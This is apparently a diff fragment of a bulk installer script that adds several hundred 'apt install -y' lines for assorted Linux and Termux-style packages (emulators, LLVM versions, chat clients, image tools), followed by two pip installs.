+apt install -y python-scikit-image
+apt install -y qt6-qtimageformats
+apt install -y qt6-qtimageformats-cross-tools
+
+apt install -y rawtherapee
+apt install -y realesrgan-ncnn-vulkan
+apt install -y ristretto
+
+apt install -y sdl-image
+
+apt install -y sdl-image-static
+
+apt install -y sdl2-image
+
+apt install -y sdl2-image-static
+
+apt install -y skyseg-ncnn
+
+apt install -y squashfs-tools-ng
+
+apt install -y termimage
+
+apt install -y termplay
+
+apt install -y timg
+
+apt install -y viu
+apt install -y vnstati
+
+apt install -y xcb-util-image
+
+apt install -y xcb-util-image-static
+apt install -y 0verkill
+apt install -y 7zip
+apt install -y 8086tiny
+
+apt install -y aichat
+apt install -y alass
+
+apt install -y alsa-lib
+
+apt install -y alsa-utils
+
+apt install -y amber
+
+apt install -y ani-cli
+apt install -y apache-orc
+
+apt install -y apache2
+
+apt install -y apr
+
+apt install -y apr-util
+
+apt install -y apt-file
+
+apt install -y apt-ftparchive
+
+apt install -y ardentryst
+
+apt install -y arj
+
+apt install -y arqiver
+
+apt install -y aspell
+apt install -y aspell-fr
+
+apt install -y asymptote
+
+apt install -y at
+
+apt install -y at-spi2-core
+
+apt install -y atool
+
+apt install -y autoconf-archive
+
+apt install -y avrdude
+
+apt install -y bastet
+
+apt install -y binaryen
+
+apt install -y bitlbee
+
+apt install -y bochs
+apt install -y bombadillo
+
+apt install -y boxes
+
+apt install -y bsdtar
+
+apt install -y c-ares
+
+apt install -y calcurse
+
+apt install -y capnproto
+
+apt install -y capstone
+
+apt install -y carbonyl
+
+apt install -y catdoc
+
+apt install -y cboard
+
+apt install -y ccache
+
+apt install -y ceu-lang
+
+apt install -y cfengine
+
+apt install -y chafa
+apt install -y chafa-static
+
+apt install -y check
+
+apt install -y check-static
+
+apt install -y cherrytree
+
+apt install -y chezmoi
+
+apt install -y chicken
+
+apt install -y chocolate-doom
+
+apt install -y choose
+
+apt install -y chromaprint
+
+apt install -y chromium
+
+apt install -y chrony
+
+apt install -y cksfv
+
+apt install -y clpeak
+apt install -y clucene
+apt install -y code-server
+
+apt install -y colm
+
+apt install -y cowsay
+
+apt install -y cppcheck
+apt install -y cpufetch
+
+apt install -y cronie
+apt install -y crunch
+
+apt install -y cryptopp
+
+apt install -y cuse
+
+apt install -y dar
+
+apt install -y debianutils
+
+apt install -y detchar
+
+apt install -y devilspie
+
+apt install -y devilspie2
+
+apt install -y dialog
+
+apt install -y diffstat
+
+apt install -y direnv
+
+apt install -y discordo
+
+apt install -y dlib
+
+apt install -y doctest
+
+apt install -y dotload
+
+apt install -y dtach
+
+apt install -y dufs
+
+apt install -y dx
+apt install -y edex-ui
+
+apt install -y enchant
+
+apt install -y enchant-static
+
+apt install -y entr
+
+apt install -y espeak
+
+apt install -y exatorrent
+
+apt install -y fastfetch
+
+apt install -y fcitx5-chinese-addons
+
+apt install -y fdm
+
+apt install -y fetchmail
+
+apt install -y file-roller
+
+apt install -y finch
+
+apt install -y finch-static
+
+apt install -y findutils
+
+apt install -y frotz
+
+apt install -y g-ir-scanner
+
+apt install -y gauche
+
+apt install -y gauche-static
+
+apt install -y gitflow-avh
+
+apt install -y gjots2
+
+apt install -y glmark2
+
+apt install -y global
+
+apt install -y gobject-introspection
+
+apt install -y graphviz
+
+apt install -y greed
+
+apt install -y grep
+
+apt install -y groonga
+
+apt install -y gsettings-desktop-schemas
+
+apt install -y gspell
+
+apt install -y gtk-update-icon-cache
+
+apt install -y gtkwave
+apt install -y gucharmap
+
+apt install -y guile
+apt install -y has
+
+apt install -y hexchat
+
+apt install -y hollywood
+
+apt install -y hugin
+
+apt install -y hunspell
+
+apt install -y hunspell-fr
+apt install -y hunspell-nl
+
+apt install -y hw-probe
+
+apt install -y hyperfine
+
+apt install -y iconv
+
+apt install -y ipv6calc
+
+apt install -y ircd-irc2
+
+apt install -y isync
+
+apt install -y kainjow-mustache
+
+apt install -y keychain
+
+apt install -y kf6-karchive
+
+apt install -y kf6-kauth
+
+apt install -y kf6-kcolorscheme
+apt install -y kitty
+
+apt install -y lcal
+
+apt install -y libarchive
+
+apt install -y libarchive-static
+
+apt install -y libarrow-cpp
+
+apt install -y libc++utilities
+
+apt install -y libccid
+
+apt install -y libchipmunk
+
+apt install -y libcpufeatures
+
+apt install -y libdispatch
+
+apt install -y libevent
+
+apt install -y libflann
+
+apt install -y libglvnd
+
+apt install -y libhdf5
+
+apt install -y libice
+
+apt install -y libllvm
+
+apt install -y libllvm-11
+
+apt install -y libllvm-13
+
+apt install -y libllvm-14
+
+apt install -y libllvm-15
+
+apt install -y libllvm-16
+
+apt install -y libllvm-classic-flang
+apt install -y libllvm-codon
+
+apt install -y liblog4cxx
+
+apt install -y liblqr
+
+apt install -y libmaa
+
+apt install -y libmcrypt
+
+apt install -y libmhash
+
+apt install -y libmpdclient
+apt install -y libnet
+apt install -y libnova
+
+apt install -y libolm
+
+apt install -y libopencc
+
+apt install -y libopencore-amr
+
+apt install -y libosl
+
+apt install -y libpano13
+
+apt install -y libpaper
+
+apt install -y libshout
+
+apt install -y libsoundtouch
+
+apt install -y libsoundtouch-static
+apt install -y libspelling
+
+apt install -y libtalloc
+
+apt install -y libtranscript
+
+apt install -y libuber-h3
+
+apt install -y libuchardet
+
+apt install -y libuchardet-static
+
+apt install -y libucontext
+
+apt install -y libunbound
+
+apt install -y libuv
+
+apt install -y libvoikko
+
+apt install -y libwv
+
+apt install -y libxapian
+
+apt install -y libxcfun
+apt install -y libyaml-cpp
+
+apt install -y libzip
+
+apt install -y lipl
+
+apt install -y litespeedtest
+apt install -y llvm
+
+apt install -y llvm-11
+
+apt install -y llvm-13
+
+apt install -y llvm-14
+
+apt install -y llvm-15
+apt install -y llvm-16
+apt install -y llvm-mingw-w64
+
+apt install -y logrotate
+apt install -y lua-lpeg
+
+apt install -y lua51-lpeg
+
+apt install -y lua52-lpeg
+
+apt install -y lua53-lpeg
+
+apt install -y luvit
+apt install -y lxappearance
+
+apt install -y lxqt-archiver
+
+apt install -y lxqt-runner
+
+apt install -y lychee
+
+apt install -y macchanger
+
+apt install -y macchina
+
+apt install -y mailsync
+apt install -y marisa
+
+apt install -y matchbox-keyboard
+apt install -y mate-session-manager
+
+apt install -y matterbridge
+
+apt install -y matterircd
+
+apt install -y mcfly
+
+apt install -y memcached
+apt install -y menu-cache
+
+apt install -y menu-cache-static
+
+apt install -y miller
+
+apt install -y moarvm
+
+apt install -y mongodb
+
+apt install -y mosh
+apt install -y mpdscribble
+
+apt install -y mtdev
+
+apt install -y mu
+
+apt install -y muchsync
+
+apt install -y mumble-server
+
+apt install -y mutt
+
+apt install -y navi
+
+apt install -y ncompress
+
+apt install -y neofetch
+
+apt install -y netcdf-c
+
+apt install -y ngircd
+apt install -y nmap-ncat
+
+apt install -y notcurses
+
+apt install -y notmuch
+
+apt install -y nqp
+
+apt install -y ocrad
+
+apt install -y okc-agents
+
+apt install -y onefetch
+
+apt install -y oneko-sakura
+
+apt install -y openbabel
+
+apt install -y openssh
+
+apt install -y ovmf
+
+apt install -y p7zip
+
+apt install -y pacman-contrib
+
+apt install -y paperkey
+
+apt install -y parallel
+
+apt install -y pcal
+
+apt install -y pcre
+
+apt install -y pdfgrep
+
+apt install -y peaclock
+
+apt install -y perl
+
+apt install -y php-apache
+
+apt install -y php-apache-ldap
+
+apt install -y php-apache-opcache
+
+apt install -y php-apache-pgsql
+apt install -y php-apache-sodium
+
+apt install -y php-apcu
+
+apt install -y php7-apache
+
+apt install -y pick
+
+apt install -y pingme
+
+apt install -y polipo
+
+apt install -y privoxy
+
+apt install -y proot
+
+apt install -y proxmark3
+apt install -y proxychains-ng
+
+apt install -y pwgen
+apt install -y pygobject
+
+apt install -y pystring
+
+apt install -y python-pyarrow
+
+apt install -y python-tokenizers
+
+apt install -y python-torch
+
+apt install -y python-torch-static
+
+apt install -y python-torchaudio
+
+apt install -y python-torchvision
+
+apt install -y qca
+
+apt install -y qemu-system-aarch64
+
+apt install -y qemu-system-aarch64-headless
+
+apt install -y qemu-system-arm
+
+apt install -y qemu-system-arm-headless
+apt install -y qemu-system-i386
+apt install -y qemu-system-i386-headless
+
+apt install -y qemu-system-m68k
+apt install -y qemu-system-m68k-headless
+
+apt install -y qemu-system-ppc
+apt install -y qemu-system-ppc-headless
+
+apt install -y qemu-system-ppc64
+
+apt install -y qemu-system-ppc64-headless
+apt install -y qemu-system-riscv32
+
+apt install -y qemu-system-riscv32-headless
+
+apt install -y qemu-system-riscv64
+
+apt install -y qemu-system-riscv64-headless
+
+apt install -y qemu-system-x86-64
+
+apt install -y qemu-system-x86-64-headless
+
+apt install -y qemu-user-aarch64
+apt install -y qrupdate-ng
+
+apt install -y qt5-qttools-cross-tools
+
+apt install -y qt5-qtwebchannel
+
+apt install -y qt6-qtcharts
+
+apt install -y qt6-qtcharts-cross-tools
+
+apt install -y qtkeychain
+apt install -y qtutilities
+apt install -y quilt
+
+apt install -y racket
+apt install -y ragel
+
+apt install -y ravencoin
+
+apt install -y rebuild-detector
+
+apt install -y recode
+
+apt install -y recoll
+
+apt install -y redis
+
+apt install -y rgbds
+
+apt install -y ripgrep
+
+apt install -y ripgrep-all
+
+apt install -y rnr
+
+apt install -y rofi
+apt install -y rubberband
+
+apt install -y rust-nightly-std-aarch64-linux-android
+apt install -y rust-std-aarch64-linux-android
+
+apt install -y rxfetch
+
+apt install -y salty-chat
+
+apt install -y sccache
+
+apt install -y schismtracker
+
+apt install -y screenfetch
+
+apt install -y sdl-mixer
+
+apt install -y sdl2-mixer
+apt install -y sdlpal
+
+apt install -y seledroid-app
+
+apt install -y sharutils
+
+apt install -y silversearcher-ag
+
+apt install -y simulavr
+
+apt install -y skyseg-ncnn
+apt install -y slashtime
+
+apt install -y snake
+apt install -y socat
+apt install -y speechd
+
+apt install -y speechd-data
+
+apt install -y squashfuse
+apt install -y squeezelite
+apt install -y squid
+
+apt install -y sse2neon
+
+apt install -y sshping
+
+apt install -y ssss
+
+apt install -y stdoutisatty
+apt install -y stemwords
+
+apt install -y stunnel
+
+apt install -y subversion
+
+apt install -y svt-av1
+
+apt install -y syncthing
+
+apt install -y tar
+
+apt install -y task-spooler
+apt install -y termbot
+
+apt install -y termux-install
+
+apt install -y teseq
+
+apt install -y texlab
+
+apt install -y texlive-bin
+
+apt install -y thunar-archive-plugin
+
+apt install -y thunar-archive-plugin-static
+apt install -y tigervnc
+apt install -y tinyemu
+apt install -y tinyscheme
+apt install -y toilet
+
+apt install -y trojan-go
+
+apt install -y ttf-dejavu
+
+apt install -y tumbler
+
+apt install -y tuxpaint
+
+apt install -y uchardet
+
+apt install -y unar
+apt install -y unicode-data
+
+apt install -y unicorn
+
+apt install -y unrar
+
+apt install -y viddy
+
+apt install -y virglrenderer
+
+apt install -y virglrenderer-android
+
+apt install -y virglrenderer-mesa-zink
+
+apt install -y vivid
+
+apt install -y vkmark
+
+apt install -y vomit
+
+apt install -y watchexec
+
+apt install -y weechat
+
+apt install -y weechat-lua-plugin
+apt install -y weechat-matrix-rs
+
+apt install -y weechat-perl-plugin
+
+apt install -y weechat-python-plugin
+apt install -y weechat-ruby-plugin
+apt install -y weggli
+
+apt install -y which
+
+apt install -y wordgrinder
+
+apt install -y wrk
+
+apt install -y xapian-tools
+
+apt install -y xarchiver
+
+apt install -y xboard
+
+apt install -y xfce4-appfinder
+apt install -y xfce4-eyes-plugin
+
+apt install -y xfce4-mailwatch-plugin
+
+apt install -y xfce4-mailwatch-plugin-static
+
+apt install -y xfce4-places-plugin
+
+apt install -y yara
+
+apt install -y z-push
+
+apt install -y z3
+
+apt install -y zssh
+
+apt install -y zziplib
+
 
 python -m pip install chromedriver
 pip install git996
